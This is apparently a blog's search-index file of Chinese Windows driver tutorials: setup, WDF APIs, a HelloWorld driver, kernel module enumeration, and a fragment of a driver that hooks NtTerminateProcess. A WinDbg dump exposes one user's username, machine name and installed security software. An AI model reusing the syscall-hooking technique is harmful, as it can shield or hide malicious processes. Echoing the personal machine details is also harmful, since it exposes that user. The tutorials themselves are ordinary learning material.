PageProtectOn();&#125;//卸载函数VOID DriverUnload(PDRIVER_OBJECT driver)&#123; UnHookNtTerminateProcess(); KdPrint((&quot;驱动程序停止运行了.\\r\\n&quot;));&#125;//入口函数，相当于mainNTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)&#123; HookNtTerminateProcess(); //注册销毁回调函数 pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125;","tags":[{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"【驱动】开发相关API整理","date":"2023-10-27T01:24:02.086Z","path":"A_OS/Windows/驱动/windows驱动开发教程/驱动开发相关函数整理/","text":"概述：驱动开发过程中，相关API的学习整理 [toc] WdfDriverCreateWdfDriverCreate 是 Windows Driver Frameworks (WDF) 中用于创建驱动程序的函数。它用于初始化驱动程序，并将其与 Windows 操作系统进行集成。 WdfDriverCreate 函数需要填写一个 WDFDRIVER 结构体来定义驱动程序的属性和行为。以下是一些常见的参数： DriverName: 驱动程序的名称，用于在调试和日志记录中标识驱动程序。 DriverVersion: 驱动程序的版本号，用于标识驱动程序的版本。 DeviceAddVersion: 用于添加新设备的 WDF 函数版本。 DriverUnload: 驱动程序卸载时的回调函数，用于清理资源并执行其他必要的操作。 DispatchTable: 一个包含驱动程序处理 IRP 请求的回调函数的表。 RegistryPath: 驱动程序在注册表中的路径，用于存储配置信息和设置。 WdfDeviceCreateWdfDeviceCreate 是 Windows Driver Frameworks (WDF) 中的一个函数，用于创建设备对象并初始化与设备相关的数据结构。它是 WDF 中非常重要和常用的函数之一。 WdfDeviceCreate 函数需要填写一个 WDFDEVICE_INIT 结构体来定义设备的属性和行为。以下是一些常见的参数： Driver: 指向驱动程序的指针，用于关联设备和驱动程序。 DeviceAttributes: 指向调用方分配的 WDF_OBJECT_ATTRIBUTES 结构的指针，该结构包含新设备的属性。 StackSize: 设备的堆栈大小，用于定义设备对象的执行环境。 DeviceInit: 指向 WDFDEVICE_INIT 结构的指针的地址，用于初始化设备的状态和行为。 在调用 WdfDeviceCreate 之后，WDF 将使用提供的参数来创建并初始化一个设备对象。然后，设备可以使用 WDF 提供的其他函数来管理设备的状态、处理请求以及与其他设备或驱动程序进行交互。 需要注意的是，WdfDeviceCreate 是一个高级别的函数，通常用于创建完整的设备对象。对于较简单的设备或需要更精细控制的情况，可能需要使用其他 WDF 函数来手动创建和配置设备对象。同时，在使用 WdfDeviceCreate 和其他 WDF 函数时，应注意遵循正确的使用方法和规范，以避免产生潜在的问题和风险。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windows驱动开发教程","slug":"A-OS/Windows/驱动/windows驱动开发教程","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"【驱动】开发相关工具","date":"2023-10-27T01:24:02.086Z","path":"A_OS/Windows/驱动/windows驱动开发教程/驱动开发相关工具/","text":"DbgView用于查看驱动输出的消息 InstDrv用户加载、启动、停止、卸载驱动","tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windows驱动开发教程","slug":"A-OS/Windows/驱动/windows驱动开发教程","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"【驱动】Visual Studio 2022 驱动开发环境准备","date":"2023-10-27T01:24:02.085Z","path":"A_OS/Windows/驱动/windows驱动开发教程/驱动开发准备(VS2022)/","text":"概述：驱动开发环境准备 [toc] 步骤一 安装sdk与wdk安装windows相关的sdk 参考微软文档：下载 Windows 驱动程序工具包 (WDK) - Windows drivers | Microsoft Learn 步骤二 调试与安装工具 下载 dbgview dbgview 在 SysinternalsSuite 套件中，下载 SysinternalsSuite 套件即可。 https://docs.microsoft.com/zh-cn/sysinternals/downloads/ 下载驱动安装器 KmdManager驱动加载调试工具 Kernel Mode Drivers Manager 1.3 free download - Software reviews, downloads, news, free trials, freeware and full commercial software - Downloadcrew PCHunter http://www.xuetr.com/ 步骤三 驱动框架1234567891011121314151617181920#include &lt;ntddk.h&gt;// #include &lt;ntifs.h&gt;NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriver)&#123; DbgPrint(&quot;Bye, Driver&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrint(&quot;Hello World, Driver&quot;); DbgPrint(&quot;DRIVER ADDress, [%]&quot;); DbgPrint(&quot;Hello World, Driver&quot;); pDriver-&gt;DriverUnload = UnloadDriver; return STATUS_SUCCESS;&#125; 步骤三 Visual Studio配置 C&#x2F;C++ -&gt; 常规 -&gt; 将警告视为错误 -&gt; 否 C&#x2F;C++ -&gt; 常规 -&gt; 警告等级 -&gt; 等级3（也可忽略） 驱动运行环境 inf2cat -&gt; 否 编译运行，会生成sys文件 其他补充禁用界面输出无用信息12ed nt!Kd_SXS_Masked nt!Kd_FUSION_Mask","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"driver","slug":"driver","permalink":"http://example.com/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windows驱动开发教程","slug":"A-OS/Windows/驱动/windows驱动开发教程","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"【驱动】HelloWorld驱动与安装","date":"2023-10-27T01:24:02.084Z","path":"A_OS/Windows/驱动/windows驱动开发教程/HelloWorld驱动与安装/","text":"概述：实现一个最简单的helloworld驱动，微软官方有相关教程 编写 Hello World Windows 驱动程序 (KMDF) - Windows drivers | Microsoft Learn Demo12345678910111213141516171819202122// #include &lt;ntddk.h&gt;#include &lt;ntifs.h&gt;NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriver)&#123; DbgPrint(&quot;Bye, Driver&quot;); return STATUS_SUCCESS;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrint(&quot;Hello World, Driver&quot;); DbgPrint(&quot;PDRIVER_OBJECT-&gt; [0x%08x]&quot;, pDriver); DbgPrint(&quot;PUNICODE_STRING-&gt;[%ws]&quot;, pReg-&gt;Buffer); pDriver-&gt;DriverUnload = UnloadDriver; return STATUS_SUCCESS;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"driver","slug":"driver","permalink":"http://example.com/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windows驱动开发教程","slug":"A-OS/Windows/驱动/windows驱动开发教程","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"【驱动】Windows内核模块名称遍历","date":"2023-10-27T01:24:02.080Z","path":"A_OS/Windows/驱动/EasyDriver/Windows内核模块名称遍历/","text":"概述：内核遍历模块名称 0x01、查看LDRWindows 内核模块信息是以结构体 _LDR_DATA_TABLE_ENTRY 形式存在于系统。 _LDR_DATA_TABLE_ENTRY 的基地址在 PEB当中，以下为是一个示例查看 _LDR_DATA_TABLE_ENTRY 结构体的示例： 环境：windows双机调试，调试环境 win10. 调试，目标 notepad.exe 获取进程id 123450: kd&gt; !process 0 0 notepad.exePROCESS ffffc6835560a080 SessionId: 1 Cid: 167c Peb: 88dcc01000 ParentCid: 1ad8 DirBase: 6590e000 ObjectTable: ffffdd03a141b380 HandleCount: 520. Image: notepad.exe 获取LDR 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611620: kd&gt; .process /p ffffc6835560a080; !peb 88dcc01000Implicit process is now ffffc683`5560a080.cache forcedecodeuser donePEB at 00000088dcc01000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: No ImageBaseAddress: 00007ff613310000 NtGlobalFlag: 0 NtGlobalFlag2: 0 Ldr 00007ffb244fc4c0 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 000001acec0f24f0 . 000001acf1b23db0 Ldr.InLoadOrderModuleList: 000001acec0f2660 . 000001acf1b23d90 Ldr.InMemoryOrderModuleList: 000001acec0f2670 . 000001acf1b23da0 Base TimeStamp Module 7ff613310000 52b5327b Dec 21 14:17:31 2013 C:\\Windows\\system32\\notepad.exe 7ffb24390000 feef31d3 Jul 15 16:12:03 2105 C:\\Windows\\SYSTEM32\\ntdll.dll 7ffb23b40000 23c0ab5e Jan 03 19:15:42 1989 C:\\Windows\\System32\\KERNEL32.DLL 7ffb21ae0000 6b4de7c9 Jan 18 18:22:01 2027 C:\\Windows\\System32\\KERNELBASE.dll 7ffb233f0000 7086f0b5 Oct 28 22:20:37 2029 C:\\Windows\\System32\\GDI32.dll 7ffb21de0000 0dcd0213 May 04 04:26:59 1977 C:\\Windows\\System32\\win32u.dll 7ffb21f00000 d31e9fa0 Mar 29 16:45:20 2082 C:\\Windows\\System32\\gdi32full.dll 7ffb21e10000 39255ccf May 19 23:25:03 2000 C:\\Windows\\System32\\msvcp_win.dll 7ffb22180000 2bd748bf Apr 23 09:39:11 1993 C:\\Windows\\System32\\ucrtbase.dll 7ffb22850000 12e47419 Jan 17 20:56:57 1980 C:\\Windows\\System32\\USER32.dll 7ffb23090000 ab88b7a1 Mar 12 22:37:21 2061 C:\\Windows\\System32\\combase.dll 7ffb236b0000 ed79d6e2 Apr 02 14:04:18 2096 C:\\Windows\\System32\\RPCRT4.dll 7ffb238c0000 29534f79 Dec 21 22:28:09 1991 C:\\Windows\\System32\\shcore.dll 7ffb235f0000 564f9f39 Nov 21 06:31:21 2015 C:\\Windows\\System32\\msvcrt.dll 7ffb20490000 db2b08ef Jul 09 13:23:59 2086 C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e\\COMCTL32.dll 7ffb23050000 68ff10be Oct 27 14:27:10 2025 C:\\Windows\\System32\\IMM32.DLL 5e050000 627c7a26 May 12 11:08:22 2022 C:\\Program Files (x86)\\360\\360Safe\\safemon\\SafeWrapper.dll 7ffb223f0000 c9418262 Dec 30 08:27:14 2076 C:\\Windows\\System32\\ADVAPI32.dll 7ffb224a0000 9003cbde Jul 26 05:45:02 2046 C:\\Windows\\System32\\sechost.dll 7ffb217a0000 618b690d Nov 10 14:39:09 2021 C:\\Program Files (x86)\\360\\360Safe\\safemon\\capid64.dll 7ffb237e0000 19bb5737 Sep 06 22:52:39 1983 C:\\Windows\\System32\\SHLWAPI.dll 7ffb21760000 63e49296 Feb 09 14:28:38 2023 C:\\Program Files (x86)\\360\\360EDRSensor\\safemon\\360EFP64.dll 7ffb21740000 f0713fcd Oct 30 14:42:21 2097 C:\\Windows\\SYSTEM32\\kernel.appcore.dll 7ffb222b0000 856685b0 Dec 03 03:17:04 2040 C:\\Windows\\System32\\bcryptPrimitives.dll 7ffb1e4f0000 16108836 Sep 24 20:23:18 1981 C:\\Windows\\system32\\uxtheme.dll 7ffb23970000 a7c9263e Mar 16 02:13:18 2059 C:\\Windows\\System32\\clbcatq.dll 7ffb18890000 0b3246d4 Dec 15 10:58:28 1975 C:\\Windows\\System32\\MrmCoreR.dll 7ffb23c00000 480c18d7 Apr 21 12:32:23 2008 C:\\Windows\\System32\\SHELL32.dll 7ffb1eac0000 7521c788 Apr 10 02:27:20 2032 C:\\Windows\\SYSTEM32\\windows.storage.dll 7ffb20ec0000 db45726f Jul 29 14:13:03 2086 C:\\Windows\\system32\\Wldp.dll 7ffb23a20000 0e8d3a56 Sep 26 23:42:14 1977 C:\\Windows\\System32\\MSCTF.dll 7ffb225d0000 d42edff1 Oct 22 04:56:17 2082 C:\\Windows\\System32\\OLEAUT32.dll 7ffb14380000 63a36c45 Dec 22 04:27:49 2022 C:\\Windows\\system32\\TextShaping.dll 7ffafdbb0000 97acfd33 Aug 21 20:10:27 2050 C:\\Windows\\System32\\efswrt.dll 7ffb0fb70000 0d302819 Jan 05 05:03:21 1977 C:\\Windows\\System32\\MPR.dll 7ffb1d420000 1b27f2ab Jun 09 12:20:59 1984 C:\\Windows\\SYSTEM32\\wintypes.dll 7ffb1b3f0000 60d2769c Jun 23 07:47:40 2021 C:\\Windows\\System32\\twinapi.appcore.dll 7ffb20e30000 24cdd509 Jul 26 23:13:13 1989 C:\\Windows\\System32\\oleacc.dll 7ffb18640000 f0c41b7e Jan 01 11:05:34 2098 C:\\Windows\\SYSTEM32\\textinputframework.dll 7ffb1db70000 ce358de3 Aug 19 04:30:27 2079 C:\\Windows\\System32\\CoreUIComponents.dll 7ffb1ded0000 d76cf31a Jul 12 19:59:22 2084 C:\\Windows\\System32\\CoreMessaging.dll 7ffb22780000 aff3315b Jul 18 10:18:03 2063 C:\\Windows\\System32\\WS2_32.dll 7ffb215c0000 3d60ad04 Aug 19 16:32:04 2002 C:\\Windows\\SYSTEM32\\ntmarta.dll 7ffb22ec0000 2f888521 Apr 10 09:08:49 1995 C:\\Windows\\System32\\ole32.dll 7ffb226a0000 20677495 Mar 25 14:09:25 1987 C:\\Windows\\System32\\comdlg32.dll 7ffb1d320000 332d6f47 Mar 18 00:20:23 1997 C:\\Windows\\system32\\PROPSYS.dll 7ffaf0910000 55510662 May 12 03:43:30 2015 C:\\Windows\\System32\\DUI70.dll 7ffaf0870000 3edb1f69 Jun 02 17:56:57 2003 C:\\Windows\\System32\\DUser.dll 7ffb1e7d0000 7ecc0a11 May 30 20:58:57 2037 C:\\Windows\\System32\\dwmapi.dll 7ffb05360000 b95c5d4e Jul 18 19:55:58 2068 C:\\Windows\\system32\\explorerframe.dll 7ffb1b110000 1fcf100d Nov 29 23:55:57 1986 C:\\Windows\\system32\\WindowsCodecs.dll 7ffb22280000 9723b943 May 09 17:20:03 2050 C:\\Windows\\System32\\bcrypt.dll 7ffb219a0000 62b75706 Jun 26 02:42:14 2022 C:\\Windows\\system32\\profapi.dll 7ffb052f0000 3aad9df3 Mar 13 12:11:31 2001 C:\\Windows\\System32\\thumbcache.dll 7ffb1be70000 223f725e Mar 17 14:29:50 1988 C:\\Windows\\SYSTEM32\\policymanager.dll 7ffb202e0000 f390ead1 Jun 29 04:13:05 2099 C:\\Windows\\system32\\msvcp110_win.dll 7ffb055b0000 49f7aa8e Apr 29 09:17:02 2009 C:\\Windows\\system32\\dataexchange.dll 7ffb1c650000 e193dcb4 Dec 05 03:44:52 2089 C:\\Windows\\system32\\d3d11.dll 7ffb1d580000 05174257 Sep 15 21:06:31 1972 C:\\Windows\\system32\\dcomp.dll 7ffb1f390000 e3f3eb09 Mar 11 09:04:09 2091 C:\\Windows\\system32\\dxgi.dll 7ffaf0820000 ca7e2859 Aug 27 12:51:37 2077 C:\\Windows\\System32\\Windows.UI.FileExplorer.dll 7ffb052c0000 be357357 Feb 15 05:12:55 2071 C:\\Windows\\system32\\edputil.dll 7ffb21eb0000 1ede815d May 31 12:43:09 1986 C:\\Windows\\System32\\CFGMGR32.dll 7ffb13cd0000 f30ed2fb Mar 22 11:56:43 2099 C:\\Windows\\System32\\Windows.FileExplorer.Common.dll 7ffb17050000 724543b6 Oct 02 11:25:42 2030 C:\\Windows\\System32\\iertutil.dll 7ffb1e3c0000 c42be918 Apr 18 01:34:16 2074 C:\\Windows\\SYSTEM32\\atlthunk.dll 7ffb16670000 da4754f3 Jan 17 20:11:31 2086 C:\\Windows\\System32\\StructuredQuery.dll 7ffb0d2f0000 c8e913db Oct 24 06:36:11 2076 C:\\Windows\\System32\\Windows.StateRepositoryPS.dll 7ffb01680000 61e9c87f Jan 21 04:39:27 2022 C:\\Windows\\system32\\Windows.Storage.Search.dll 7ffb1e3d0000 3ffe0471 Jan 09 09:31:29 2004 C:\\Windows\\system32\\LINKINFO.dll 7ffb21950000 441329cb Mar 12 03:49:31 2006 C:\\Windows\\system32\\SspiCli.dll 7ffae9d40000 e3a65137 Jan 11 12:23:19 2091 C:\\Program Files\\Common Files\\microsoft shared\\ink\\tiptsf.dll 7ffb23840000 a2ae2189 Jun 27 16:40:41 2056 C:\\Windows\\System32\\coml2.dll 7ffb07d90000 3f50139a Aug 30 11:01:46 2003 C:\\Windows\\System32\\twinapi.dll 7ffb1e3e0000 9d68abf2 Sep 08 02:31:14 2053 C:\\Windows\\system32\\apphelp.dll 7ffb22a50000 7680a595 Jan 01 05:48:05 2033 C:\\Windows\\System32\\SETUPAPI.dll 7ffb21890000 14531102 Oct 21 22:56:02 1980 C:\\Windows\\SYSTEM32\\VERSION.dll 7ffb055f0000 6a605d4a Jul 22 14:03:54 2026 C:\\Windows\\system32\\cldapi.dll 7ffb21600000 2ea9f33d Oct 23 13:23:09 1994 C:\\Windows\\system32\\FLTLIB.DLL 7ffb13620000 cfe5ad8c Jul 11 23:04:44 2080 C:\\Users\\holdy\\AppData\\Local\\Microsoft\\OneDrive\\23.189.0910.0001\\FileSyncShell64.dll 7ffb22020000 884d1633 Jun 19 09:15:31 2042 C:\\Windows\\System32\\CRYPT32.dll 7ffb0c940000 42b0d806 Jun 16 09:38:14 2005 C:\\Windows\\SYSTEM32\\WININET.dll 7ffb1fe00000 7aec0e44 May 09 10:28:20 2035 C:\\Windows\\SYSTEM32\\Secur32.dll 7ffb1d7a0000 5e1a2a61 Jan 12 04:04:49 2020 C:\\Windows\\SYSTEM32\\WTSAPI32.dll 7ffb21920000 ccba460f Nov 04 11:54:55 2078 C:\\Windows\\SYSTEM32\\USERENV.dll 7ffb20d30000 28e89a43 Oct 01 23:54:43 1991 C:\\Windows\\system32\\CRYPTBASE.DLL 7ffb18e60000 75e918f4 Sep 08 06:55:48 2032 C:\\Windows\\System32\\EhStorShell.dll 7ffb13b40000 a373b917 Nov 24 13:43:51 2056 C:\\Windows\\SYSTEM32\\ntshrui.dll 7ffb140f0000 8c31e680 Jul 14 11:41:52 2044 C:\\Windows\\System32\\cscui.dll 7ffb16cd0000 5430eec3 Oct 05 15:09:55 2014 C:\\Windows\\system32\\srvcli.dll 7ffb0bc50000 31063a34 Jan 24 21:55:00 1996 C:\\Windows\\system32\\cscapi.dll 7ffb18ea0000 b8ca2d77 Mar 29 22:40:55 2068 C:\\Windows\\system32\\WINMM.dll 7ffb1d7c0000 13731e9b May 05 02:06:19 1980 C:\\Windows\\system32\\mssprxy.dll 7ffb16d00000 7499a51d Dec 28 20:12:13 2031 C:\\Windows\\System32\\urlmon.dll 7ffb20d90000 fcf57d1b Jun 27 02:06:19 2104 C:\\Windows\\System32\\netutils.dll 7ffb1e380000 499386c1 Feb 12 10:17:37 2009 C:\\Windows\\system32\\NetworkExplorer.dll SubSystemData: 00007ffb1b5cf1d0 ProcessHeap: 000001acec0f0000 ProcessParameters: 000001acec0f1c90 CurrentDirectory: &#x27;C:\\Users\\holdy\\&#x27; WindowTitle: &#x27;C:\\Windows\\system32\\notepad.exe&#x27; ImageFile: &#x27;C:\\Windows\\system32\\notepad.exe&#x27; CommandLine: &#x27;&quot;C:\\Windows\\system32\\notepad.exe&quot; &#x27; DllPath: &#x27;&lt; Name not readable &gt;&#x27; Environment: 000001acec0f0fe0 =::=::\\ ALLUSERSPROFILE=C:\\ProgramData APPDATA=C:\\Users\\holdy\\AppData\\Roaming CLASSPATH=C:\\Program Files\\Java\\jdk-17\\lib CommonProgramFiles=C:\\Program Files\\Common Files CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files CommonProgramW6432=C:\\Program Files\\Common Files COMPUTERNAME=DESKTOP-SM6JRAO ComSpec=C:\\Windows\\system32\\cmd.exe DriverData=C:\\Windows\\System32\\Drivers\\DriverData HOMEDRIVE=C: HOMEPATH=\\Users\\holdy JAVA_HOME=C:\\Program Files\\Java\\jdk-17 LOCALAPPDATA=C:\\Users\\holdy\\AppData\\Local LOGONSERVER=\\\\DESKTOP-SM6JRAO NUMBER_OF_PROCESSORS=2 OneDrive=C:\\Users\\holdy\\OneDrive OneDriveConsumer=C:\\Users\\holdy\\OneDrive OS=Windows_NT Path=%JAVA_HOME%\\bin;C:\\Program Files\\Java\\jdk-17\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\holdy\\AppData\\Local\\Microsoft\\WindowsApps; PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 140 Stepping 1, GenuineIntel PROCESSOR_LEVEL=6 PROCESSOR_REVISION=8c01 ProgramData=C:\\ProgramData ProgramFiles=C:\\Program Files ProgramFiles(x86)=C:\\Program Files (x86) ProgramW6432=C:\\Program Files PSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PUBLIC=C:\\Users\\Public SESSIONNAME=Console SystemDrive=C: SystemRoot=C:\\Windows TEMP=C:\\Users\\holdy\\AppData\\Local\\Temp TMP=C:\\Users\\holdy\\AppData\\Local\\Temp USERDOMAIN=DESKTOP-SM6JRAO USERDOMAIN_ROAMINGPROFILE=DESKTOP-SM6JRAO USERNAME=holdy USERPROFILE=C:\\Users\\holdy windir=C:\\Windows 查看LDR 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960610: kd&gt; dt _LDR_DATA_TABLE_ENTRY 00007ffb244fc4c0ntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000001`00000058 - 0x00000000`00000000 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x000001ac`ec0f2660 - 0x000001ac`f1b23d90 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x000001ac`ec0f2670 - 0x000001ac`f1b23da0 ] +0x030 DllBase : 0x000001ac`ec0f24f0 Void +0x038 EntryPoint : 0x000001ac`f1b23db0 Void +0x040 SizeOfImage : 0 +0x048 FullDllName : _UNICODE_STRING &quot;&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;&quot; +0x068 FlagGroup : [4] &quot;&quot; +0x068 Flags : 0 +0x068 PackagedBinary : 0y0 +0x068 MarkedForRemoval : 0y0 +0x068 ImageDll : 0y0 +0x068 LoadNotificationsSent : 0y0 +0x068 TelemetryEntryProcessed : 0y0 +0x068 ProcessStaticImport : 0y0 +0x068 InLegacyLists : 0y0 +0x068 InIndexes : 0y0 +0x068 ShimDll : 0y0 +0x068 InExceptionTable : 0y0 +0x068 ReservedFlags1 : 0y00 +0x068 LoadInProgress : 0y0 +0x068 LoadConfigProcessed : 0y0 +0x068 EntryProcessed : 0y0 +0x068 ProtectDelayLoad : 0y0 +0x068 ReservedFlags3 : 0y00 +0x068 DontCallForThreads : 0y0 +0x068 ProcessAttachCalled : 0y0 +0x068 ProcessAttachFailed : 0y0 +0x068 CorDeferredValidate : 0y0 +0x068 CorImage : 0y0 +0x068 DontRelocate : 0y0 +0x068 CorILOnly : 0y0 +0x068 ChpeImage : 0y0 +0x068 ReservedFlags5 : 0y00 +0x068 Redirected : 0y0 +0x068 ReservedFlags6 : 0y00 +0x068 CompatDatabaseProcessed : 0y0 +0x06c ObsoleteLoadCount : 0 +0x06e TlsIndex : 0 +0x070 HashLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x080 TimeDateStamp : 0x16510000 +0x088 EntryPointActivationContext : 0x00000000`00020000 _ACTIVATION_CONTEXT +0x090 Lock : 0x61db9c30`00000000 Void +0x098 DdagNode : 0x00770073`0002815d _LDR_DDAG_NODE +0x0a0 NodeModuleLink : _LIST_ENTRY [ 0x00690072`00650076 - 0x00340036`00790066 ] +0x0b0 LoadContext : 0x006c006c`0064002e _LDRP_LOAD_CONTEXT +0x0b8 ParentDllBase : (null) +0x0c0 SwitchBackContext : (null) +0x0c8 BaseAddressIndexNode : _RTL_BALANCED_NODE +0x0e0 MappingInfoIndexNode : _RTL_BALANCED_NODE +0x0f8 OriginalBase : 0x61db9c30`00000001 +0x100 LoadTime : _LARGE_INTEGER 0x00770073`0002815d +0x108 BaseNameHashValue : 0x650076 +0x10c LoadReason : 0x690072 (No matching name) +0x110 ImplicitPathOptions : 0x790066 +0x114 ReferenceCount : 0x340036 +0x118 DependentLoadFlags : 0x64002e +0x11c SigningLevel : 0x6c &#x27;l&#x27; 0x02、通过驱动程序读取 LDR上述我们已经知道了 _LDR_DATA_TABLE_ENTRY 的结构体，下一步就可以根据其结构体在驱动程序中读取内核模块了。 1234567891011typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; UINT64 SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;&#125;LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; 在驱动进程中，NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, UNICODE_STRING RegistryPath) 的 DriverObject 保存了当前驱动的 LDR_DATA_TABLE_ENTRY 地址。 基于这一点，完整的程序代码如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;wdm.h&gt;typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; UINT64 SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;&#125;LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;VOID DriverUnload(PDRIVER_OBJECT DriverObject)&#123; DbgPrint(&quot;DriverUnload&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, UNICODE_STRING RegistryPath)&#123; NTSTATUS status = STATUS_SUCCESS; DbgPrint(&quot;DriverEntry&quot;); DriverObject-&gt;DriverUnload = DriverUnload; PLDR_DATA_TABLE_ENTRY pDection = DriverObject-&gt;DriverSection; //获取当前驱动的LDR_DATA_TABLE_ENTRY地址 PLDR_DATA_TABLE_ENTRY pCurrentDection = pDection; //记录当前驱动LDR_DATA_TABLE_ENTRY地址 do &#123; pDection = pDection-&gt;InLoadOrderLinks.Flink; //先查询下一个 DbgPrint(&quot;%ws&quot;, pDection-&gt;BaseDllName.Buffer); //输出模块名 &#125; while (pCurrentDection != pDection); //遍历到当前驱动LDR_DATA_TABLE_ENTRY地址时，说明查询结束 return status;&#125; 